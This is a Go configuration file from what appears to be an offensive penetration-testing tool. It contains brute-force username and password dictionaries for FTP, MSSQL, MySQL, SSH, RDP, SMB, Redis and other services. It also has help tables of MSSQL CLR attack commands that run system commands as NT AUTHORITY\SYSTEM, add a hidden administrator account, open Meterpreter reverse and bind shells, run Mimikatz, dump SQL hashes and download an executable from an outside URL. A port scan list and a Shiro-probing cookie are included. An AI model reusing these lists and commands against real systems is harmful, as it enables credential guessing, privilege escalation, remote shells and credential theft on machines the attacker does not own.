package config

import (
	"time"
)

// about login struct

type HostIn struct {
	Host      string
	Port      int
	Domain    string
	TimeOut   time.Duration
	PublicKey string
}

// 爆破的默认用户名

var Userdict = map[string][]string{
	"ftp":      {"kali", "ftp", "admin", "www", "web", "root", "db", "wwwroot", "data"},
	"mysql":    {"root", "mysql"},
	"mssql":    {"sa", "sql"},
	"smb":      {"administrator", "admin", "guest"},
	"rdp":      {"administrator", "admin", "guest", "Oadmin"},
	"postgres": {"postgres", "admin"},
	"ssh":      {"root", "admin", "kali", "oracle", "www"},
	"mongodb":  {"root", "admin"},
	"redis":    {"root"},
}

// 爆破的默认密码

var Passwords = []string{"123456", "admin", "admin123", "root", "12312", "pass123", "pass@123", "930517", "password", "123123", "654321", "111111", "123", "1", "admin@123", "Admin@123", "admin123!@#", "{user}", "{user}1", "{user}111", "{user}123", "{user}@123", "{user}_123", "{user}#123", "{user}@111", "{user}@2019", "{user}@123#4", "P@ssw0rd!", "P@ssw0rd", "Passw0rd", "qwe123", "12345678", "test", "test123", "123qwe!@#", "123456789", "123321", "666666", "a123456.", "123456~a", "123456!a", "000000", "1234567890", "8888888", "!QAZ2wsx", "1qaz2wsx", "abc123", "abc123456", "1qaz@WSX", "a11111", "a12345", "Aa1234", "Aa1234.", "Aa12345", "a123456", "a123123", "Aa123123", "Aa123456", "Aa12345.", "sysadmin", "system", "1qaz!QAZ", "2wsx@WSX", "qwe123!@#", "Aa123456!", "A123456s!", "sa123456", "1q2w3e", "kali"}

var WarKitHelp = [][]string{
	{"**IF You Want SQL Command Execute**", "declare @result varchar(4000);EXEC sp_cmdExec 'ipconfig',@result output; select @result"},
	{"EXEC sp_cmdExec 'whoami'", "Any Windows command"},
	{"EXEC sp_cmdExec 'whoami /RunSystemPriv'", "Any Windows command with NT AUTHORITY\\SYSTEM rights"},
	{`EXEC sp_cmdExec '"net user eyup P@ssw0rd1 /add"`, "Adding users with RottenPotato (Kumpir)"},
	{`EXEC sp_cmdExec '"net localgroup administrators eyup /add" /RunSystemPriv'`, "Adding user to localgroup with RottenPotato (Kumpir)"},
	{`EXEC sp_cmdExec 'powershell Get-ChildItem /RunSystemPS'`, "(Powershell) with RottenPotato (Kumpir)"},
	{`EXEC sp_cmdExec 'sp_meterpreter_reverse_tcp LHOST LPORT GetSystem'`, `x86 Meterpreter Reverse Connection with  NT AUTHORITY\SYSTEM`},
	{`EXEC sp_cmdExec 'sp_x64_meterpreter_reverse_tcp LHOST LPORT GetSystem`, "x64 Meterpreter Reverse Connection with  NT AUTHORITY\\SYSTEM"},
	{`EXEC sp_cmdExec 'sp_meterpreter_reverse_rc4 LHOST LPORT GetSystem'`, "x86 Meterpreter Reverse Connection RC4 with  NT AUTHORITY\\SYSTEM, RC4PASSWORD=warsql"},
	{`EXEC sp_cmdExec 'sp_meterpreter_bind_tcp LPORT GetSystem'`, "x86 Meterpreter Bind Connection with  NT AUTHORITY\\SYSTEM"},
	{`EXEC sp_cmdExec 'sp_Mimikatz'`, `select * from WarSQLKitTemp => Get Mimikatz Log`},
	{`EXEC sp_cmdExec 'sp_downloadFile http://eyupcelik.com.tr/file.exe C:\ProgramData\file.exe 300'`, `Download File`},
	{`EXEC sp_cmdExec 'sp_getSqlHash'`, `Get MSSQL Hash`},
	{`EXEC sp_cmdExec 'sp_getProduct'`, `Get Windows Product`},
	{`EXEC sp_cmdExec 'sp_getDatabases'`, `Get Available Databases`},
}

var SharpKitHelp = [][]string{
	{"EXEC ClrExec 'clr_ping ip'", "Detect whether the target is reachable"},
	{"EXEC ClrExec 'clr_cat filename'", "Viewing target file Contents"},
	{`EXEC ClrExec 'clr_ls dir'`, "Listing directory files"},
	{`EXEC ClrExec 'clr_rm filename'`, "rm traget file"},
	{`EXEC ClrExec 'clr_getav'`, "List target host kill software"},
	{`EXEC ClrExec 'clr_rdp'`, `Open the remote desktop and return to the remote desktop port`},
	{`EXEC ClrExec 'clr_efspotato whoami'`, "Calls efspotato to execute system commands"},
	{`EXEC ClrExec 'clr_badpotato whoami'`, "Calls badpotato to execute system commands"},
	{`EXEC ClrExec 'clr_netstat'`, "Listing netstat -an result"},
}

var (
	// DisMapPorts TODO: dismp 默认端口号

	DisMapPorts = "80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,443,800,801,808,880,888,889,1000,1080,1880,1881,2000,2001,2601,3443,7001,7007,7010,7070,7878,8000,8001,8002,8003,8004,8005,8006,8007,8008,8009,8010,8011,8012,8016,8017,8018,8019,8022,8029,8030,8060,8069,8070,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8096,8097,8098,8099,8100,8101,8105,8108,81110,8161,8175,8188,8189,8200,8201,8222,8300,8360,8443,8445,8448,8484,8499,8500,8800,8848,8879,8880,8881,8888,8899,8983,8989,9000,9001,9002,9008,9010,9043,9060,9080,9081,9082,9083,9084,9085,9086,9087,9088,9089,9090,9091,9092,9093,9094,9095,9096,9097,9098,9099,9100,9200,9300,9443,9448,9500,9628,9800,9899,9981,9986,9988,9998,9999,11001"

	// DefaultHeader TODO: 默认User-Agent

	DefaultHeader = map[string]string{
		"Accept-Language": "zh,zh-TW;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6",
		"User-agent":      "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36",
		"Cookie":          "rememberMe=int",
	}
)
